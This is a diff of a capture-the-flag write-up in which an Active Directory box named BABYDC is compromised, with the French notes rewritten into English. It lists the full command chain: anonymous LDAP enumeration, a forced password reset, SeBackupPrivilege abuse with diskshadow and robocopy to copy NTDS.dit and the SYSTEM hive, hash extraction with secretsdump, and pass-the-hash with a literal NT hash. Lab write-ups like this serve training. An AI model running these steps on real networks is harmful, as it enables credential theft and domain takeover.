@@ -1,4 +1,27 @@
-Nmap de la box :
+This document provides a step-by-step walkthrough of an Active Directory penetration test on the target machine (BABYDC). The purpose was to enumerate and exploit weaknesses in the environment to gain administrative access.
+
+Tools Used
+
+    Nmap: Network scanning and enumeration
+    Netexec (nxc): LDAP and SMB enumeration
+    smbpasswd: Password manipulation tool
+    Evil-WinRM: Remote access for Windows machines
+    Diskshadow: Volume shadow copy manipulation
+    Robocopy: File transfer within Windows
+    Secretsdump.py: Hash extraction from NTDS.dit
+    
+Summary of Attacks
+
+    Network Enumeration: Identified open ports and services running on the target.
+    LDAP Enumeration: Retrieved sensitive user information via anonymous bind.
+    Password Change: Identified a valid user and changed their password to gain access.
+    Privilege Escalation: Leveraged the SeBackupPrivilege to extract sensitive data (NTDS.dit and SYSTEM hive).
+    Hash Dumping and Admin Access: Extracted NTLM hashes to gain administrative access and retrieve the final flag.
+    Nmap de la box :
+
+Enumeration
+
+Using Nmap, open ports and services were identified:
 
 ```
 PORT     STATE SERVICE       VERSION
@@ -20,44 +43,44 @@ PORT     STATE SERVICE       VERSION
 Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-On tente de voir si on peut se connecter 
 
 ![i](Images/20241213023917.png)
 
-On a une connexion valide sans identifiant.
-On tente d'énumerer les users ou les shares avec --users pui --shares mais sans succès :
+A connection test revealed a valid connection via SMB without authentication but failed user or share enumeration:
 
 ![i](Images/20241213024456.png)
 
-Par contre avec ldap on obtient un retour pertinent :
-
+Anonymous LDAP bind returned useful information about domain users:
 ![i](Images/20241213024523.png)
 
-Ensuite on obtient quelque chose d'encore plus pertinent graĉe au module get-desc-users de netexec en utilisant cette commande :
+LDAP Enumeration
+
+Using the get-desc-users module in Netexec, further details about user accounts were retrieved:
+
 nxc ldap 10.10.126.10 -u "" -p "" -M get-desc-users  
 
 ![i](Images/20241213024833.png)
 
-Le mdp qu'on obtient n'est pas valide pour aucun utilisateur
-Par contre on repère un msg d'erreur intéressant pour l'utilisateur Caroline.Robinson :
+4.3 Password Change and Privilege Verification
+
+An error message revealed that Caroline.Robinson had a valid account but required a password reset. 
 
 ![i](Images/20241213031525.png)
-
-Le mdp est valide pour elle apparement mais elle doit changer de mdp.
-
-Grâce à cette commande on change son mdp à Password123 :
+ 
+The password was reset to Password123 using:
 smbpasswd -r 10.10.126.10 -U caroline.robinson 
 
-On vérifie que cela a marché et ensuite on regarde les privilèges associés à l'utilisateur en exécutant "whoami /priv" grâce à cette commande :
+Access was verified, and user privileges were checked using Netexec and the whoami /priv command:
 
 nxc winrm 10.10.126.10 -u caroline.robinson -p "Password123" -X "whoami /priv" 
 
 ![i](Images/20241213061303.png)
 
-On remarque directement le privilège SeBackupPrivilege.
-On va utiliser cela pour récupérer le fichier NTDS.dit 
+The SeBackupPrivilege was identified, enabling access to sensitive files.
+A shadow copy was created using Diskshadow, and the NTDS.dit and SYSTEM hive were extracted:
 
-On met ça dans un fichier raj.dsh :
+    Create a shadow copy:
+raj.dsh contents:
 ```
 set context persistent nowriters
 add volume c: alias raj
@@ -65,12 +88,11 @@ create
 expose %raj% z:
 ```
 
-On fait cette commande :
 ```
 unix2dos raj.dsh
 ```
 
-Puis sur la machine via evil-winrm :
+Upload and execute commands via Evil-WinRM:
 ```
 cd C:\Temp
 upload raj.dsh
@@ -78,26 +100,26 @@ diskshadow /s raj.dsh
 robocopy /b z:\windows\ntds . ntds.dit
 ```
 
-On aura aussi besoin du fichier system pour déchiffrer le NTDS.dit
 
 ```
 reg save hklm\system c:\Temp\system
 ```
 
-On télécharge les deux fichiers grâce à la commande download dans evil-winrm
-```
+Download files locally:```
 download ntds.dit
 download system
 ```
 
-On utilise secretsdump pour pour extraire les hash des utilisateurs :
+Hash Extraction and Privilege Escalation
+
+The Secretsdump tool was used to extract NTLM hashes:
 ```
 secretsdump.py -ntds ntds.dit -system system.hive LOCAL
 ```
 
 ![i](Images/20241213062005.png)
 
-On utilise le hash NT de l'administrateur pour récupérer le dernier flag grâce à cette commande :
+Using the NT hash for the administrator account, final access was gained, and the last flag retrieved:
 
  nxc winrm 10.10.126.10 -u administrator -H ee4457ae59f1e3fbd764e33d9cef123d -X "cat C:\Users\Administrator\Desktop\root.txt"
  
